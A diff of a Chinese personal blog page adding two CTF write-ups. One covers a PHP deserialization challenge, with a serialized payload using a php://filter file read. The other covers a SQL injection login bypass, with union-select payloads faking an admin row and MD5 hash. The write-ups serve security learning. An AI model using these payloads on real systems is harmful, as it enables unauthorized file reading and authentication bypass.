@@ -7,7 +7,7 @@
 <meta name="description" content="温故而知新">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<link rel="shortcut icon" href="https://jinqipiaopiao.github.io//favicon.ico?v=1624195546650">
+<link rel="shortcut icon" href="https://jinqipiaopiao.github.io//favicon.ico?v=1624338322354">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
 <link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
@@ -551,6 +551,201 @@ tmp = &quot;start=&gt;{0},mid={1},end={2}&quot;.format(start,mid,end)
 print(''.join(chr(x) for x in mids))
 </code></pre>
 <figure data-type="image" tabindex="2"><img src="https://jinqipiaopiao.github.io//post-images/1624089437125.png" alt="" loading="lazy"></figure>
+<h1 id="网鼎杯-2020-青龙组areuserialz">[网鼎杯 2020 青龙组]AreUSerialz</h1>
+<p>1.题目源码</p>
+<pre><code>&lt;?php
+
+include(&quot;flag.php&quot;);
+
+highlight_file(__FILE__);
+
+class FileHandler {
+
+protected $op;
+protected $filename;
+protected $content;
+
+function __construct() {
+$op = &quot;1&quot;;
+$filename = &quot;/tmp/tmpfile&quot;;
+$content = &quot;Hello World!&quot;;
+$this-&gt;process();
+}
+
+public function process() {
+if($this-&gt;op == &quot;1&quot;) {
+$this-&gt;write();
+} else if($this-&gt;op == &quot;2&quot;) {
+$res = $this-&gt;read();
+$this-&gt;output($res);
+} else {
+$this-&gt;output(&quot;Bad Hacker!&quot;);
+}
+}
+
+private function write() {
+if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {
+if(strlen((string)$this-&gt;content) &gt; 100) {
+$this-&gt;output(&quot;Too long!&quot;);
+die();
+}
+$res = file_put_contents($this-&gt;filename, $this-&gt;content);
+if($res) $this-&gt;output(&quot;Successful!&quot;);
+else $this-&gt;output(&quot;Failed!&quot;);
+} else {
+$this-&gt;output(&quot;Failed!&quot;);
+}
+}
+
+private function read() {
+$res = &quot;&quot;;
+if(isset($this-&gt;filename)) {
+$res = file_get_contents($this-&gt;filename);
+}
+return $res;
+}
+
+private function output($s) {
+echo &quot;[Result]: &lt;br&gt;&quot;;
+echo $s;
+}
+
+function __destruct() {
+if($this-&gt;op === &quot;2&quot;)
+$this-&gt;op = &quot;1&quot;;
+$this-&gt;content = &quot;&quot;;
+$this-&gt;process();
+}
+
+}
+
+function is_valid($s) {
+for($i = 0; $i &lt; strlen($s); $i++)
+if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
+return false;
+return true;
+}
+
+if(isset($_GET{'str'})) {
+
+$str = (string)$_GET['str'];
+if(is_valid($str)) {
+$obj = unserialize($str);
+}
+
+}
+</code></pre>
+<p>这是一个PHP反序列化的题目，首先看到需要传入一个’str’，而且通过is_valid()规定了传入的每一个字符的ASCII码的范围必须在32到125之间，然后对这个’str’进行反序列化操作。</p>
+<p>在反序列化中，先调用__destruct()析构方法：</p>
+<pre><code>function __destruct() {
+if($this-&gt;op === &quot;2&quot;)
+$this-&gt;op = &quot;1&quot;;
+$this-&gt;content = &quot;&quot;;
+$this-&gt;process();
+}
+</code></pre>
+<p>从__destruct()代码中可以看到，如果op === “2”，那么op会被赋值为&quot;1&quot;，然后content会赋值为空，并执行process函数，这里 if 中的判断语句用的是强类型比较。<br>
+然后看看process函数：</p>
+<pre><code>public function process() {
+if($this-&gt;op == &quot;1&quot;) {
+$this-&gt;write();
+} else if($this-&gt;op == &quot;2&quot;) {
+$res = $this-&gt;read();
+$this-&gt;output($res);
+} else {
+$this-&gt;output(&quot;Bad Hacker!&quot;);
+}
+}
+</code></pre>
+<p>代码内容为：如果op == “1”，执行write()函数;如果op ==“2”,执行read函数，同时将结果赋值给$res，然后输出；否则将输出&quot;Bad Hacker！&quot;。</p>
+<p>这里 if 语句中的判断语句用的是弱类型的比较，那么只要op=2，这个是int整数型的2，那么op === “2” 则为False， op == &quot;2&quot;则为True，就可以进入read函数。</p>
+<p>再看看read函数：</p>
+<pre><code>private function read() {
+$res = &quot;&quot;;
+if(isset($this-&gt;filename)) {
+$res = file_get_contents($this-&gt;filename);
+}
+return $res;
+}
+</code></pre>
+<p>在read函数中，使用filename调用file_get_contents函数将文件内容赋值给$res输出。</p>
+<p>这里的filename是我们可控的，那么可以用前不久学的php://filter伪协议读取文件。然后使用output函数输出。</p>
+<pre><code>private function output($s) {
+echo &quot;[Result]: &lt;br&gt;&quot;;
+echo $s;
+}
+</code></pre>
+<p>那么现在整个反序列过程就清楚了：<br>
+1.将op = 2<br>
+2.filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</p>
+<pre><code>&lt;?php
+class FileHandler {
+
+protected $op=2;
+protected $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;
+protected $content;
+
+}
+
+$a = new FileHandler();
+echo serialize($a);
+?&gt;
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1624333261046.png" alt="" loading="lazy"><br>
+原因是在于 <code>$op $filename $content</code>三个变量权限都是protected，而protected权限的变量在序列化时会有%00*%00字符，%00字符的ASCII码为0，不在is_valid函数规定的32到125的范围内。<br>
+可以使用一种简单的办法绕过：因为php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public就可以了。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1624333257382.png" alt="" loading="lazy"><br>
+那么现在就可以使用这个payload来读取flag：</p>
+<pre><code>?str=O:11:%22FileHandler%22:3:{s:2:%22op%22;i:2;s:8:%22filename%22;s:57:%22php://filter/read=convert.base64-encode/resource=flag.php%22;s:7:%22content%22;N;
+</code></pre>
+<p>然后进行解码即可<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1624333252468.png" alt="" loading="lazy"><br>
+总结：<br>
+1.区分强类型比较和弱类型比较进行绕过<br>
+2.加深对php序列化和反序列化过程的理解</p>
+<p>php序列化与反序列化方法：</p>
+<pre><code>__construct 当一个对象创建时被调用
+__destruct 当一个对象销毁时被调用
+__toString 当一个对象被当作一个字符串使用
+__sleep 在对象被序列化之前运行
+__wakeup 在对象被反序列化之后被调用
+</code></pre>
+<p>参考：<br>
+https://www.freebuf.com/articles/web/209975.html<br>
+https://www.cnblogs.com/tr1ple/p/11156279.html</p>
+<p>————————————————<br>
+版权声明：本文为CSDN博主「嗯？？嗯。」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/qq_40860153/article/details/109018483</p>
+<h1 id="gxyctf2019babysqli">[GXYCTF2019]BabySQli#</h1>
+<p>这题的知识点是绕过密码的md5验证，参考Y1ng师傅的文章<br>
+看到题目，fuzz了一下，过滤的并不多(415是没过滤的，419是过滤的)<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1624336018360.png" alt="" loading="lazy"><br>
+而且页面源码有给sql语句，不过需要先base32再base64解码</p>
+<pre><code>select * from user where username = '$name'
+</code></pre>
+<p>直接可以用联合注入，表里有三列</p>
+<pre><code>1' Order by 3#
+</code></pre>
+<p>进行用联合注入，回显wrong user!，说明用户不在第一列</p>
+<pre><code>1' union select 1,2,3#
+</code></pre>
+<p>尝试将用户名放在第二列，回显wrong pass!，找到用户名在第二列</p>
+<pre><code>1' union select 1,'admin',3#
+</code></pre>
+<p>接下里就是要绕过密码的md5验证，需要把我们输入的值和数据库里面存放的用户密码的md5值进行比较，那要怎么绕过呢？可以用联合查询语句用来生成虚拟的表数据</p>
+<p>首先可以看到该表只有一个用户<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1624336023503.png" alt="" loading="lazy"><br>
+然后我们可以用联合查询的方式将查询的数据插入到表中<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1624336026579.png" alt="" loading="lazy"></p>
+<p>通过这样的方式，我们就可以用构造payload</p>
+<p>用户名输入（‘e10adc3949ba59abbe56e057f20f883e’是 123456的md5值）</p>
+<pre><code>1' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#
+</code></pre>
+<p>密码输入</p>
+<pre><code>123456
+</code></pre>
+<p>POST请求 ,获得flag<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1624336030766.png" alt="" loading="lazy"></p>
 
             </div>
           </article>
@@ -574,7 +769,7 @@ print(''.join(chr(x) for x in mids))
 
       <div class="sm-12 md-4 col sidebar">
   <div class="paper info-container">
-    <img src="https://jinqipiaopiao.github.io//images/avatar.png?v=1624195546650" class="no-responsive avatar">
+    <img src="https://jinqipiaopiao.github.io//images/avatar.png?v=1624338322354" class="no-responsive avatar">
     <div class="text-muted">温故而知新</div>
     <div class="social-container">
       
@@ -596,6 +791,12 @@ print(''.join(chr(x) for x in mids))
     </div>
     <div class="row">
       <ul>
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/sql-zhu-ru-guo-lu-zi-fu-de-fuzz-jiao-ben-ce-shi/">SQL注入过滤字符的Fuzz脚本测试</a>
+            </li>
+          
         
           
             <li>
@@ -651,10 +852,6 @@ print(''.join(chr(x) for x in mids))
             </li>
           
         
-          
-            <li>
-              <a href="https://jinqipiaopiao.github.io/post/ctfshowweb/">CTF.Show:WEB</a>
-            </li>
           
         
           
@@ -750,7 +947,7 @@ print(''.join(chr(x) for x in mids))
     </div>
     <div class="row">
       
-        <a href="https://jinqipiaopiao.github.io/tag/I-a6dyp2Q/" class="badge ">
+        <a href="https://jinqipiaopiao.github.io/tag/I-a6dyp2Q/" class="badge secondary">
           Gridea
         </a>
       
